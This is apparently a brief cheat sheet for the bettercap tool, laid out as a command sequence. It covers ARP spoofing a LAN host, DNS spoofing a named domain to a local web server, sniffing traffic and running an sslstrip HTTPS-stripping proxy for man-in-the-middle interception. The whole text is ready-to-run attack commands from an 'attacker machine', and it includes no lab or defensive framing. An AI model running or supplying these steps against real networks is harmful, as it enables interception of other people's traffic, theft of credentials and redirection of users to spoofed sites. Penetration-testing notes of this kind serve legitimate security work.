# bettercap

###  Using bettercap for dns spoofing 

In a local network, you can DNS queries using ARP spoofing

##### Activate router mode on attacker machine
```sh
echo 1 > /proc/sys/net/ipv4/ip_forward
```

##### Show machines in the LAN
```sh
> net.show
```

##### Set target for ARP spoofing
```sh
> set arp.spoof.targets 192.168.5.99
```

##### Launch attack
```sh
> arp.spoof on
```

##### Set domain to spoof, spoof.all allow to also consider external requests and not only local ones
```sh
> set dns.spoof.domains apache.org
> set dns.spoof.all true
> dns.spoof on
```

##### You can then create a local web server
```sh
> set http.server.path /var/www/html
> http.server on
```


##  ARP Spoofing using Bettercap

### Activate router mode on attacker machine
```sh
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### Show machines in the LAN
```sh
> net.show
```

### Set target for ARP spoofing
```sh
> set arp.spoof.targets 192.168.5.99
```
### Launch attack
```sh
> arp.spoof on
```

## Proxy MiTM using Bettercap

### Configure sniffer verbosity
```sh
> set net.sniff.verbose false
> net.sniff on
```

### Then set the SSL proxy (It will create an autogenerated SSL cert)
```sh
> set http.proxy.sslstrip true
> http.proxy on
```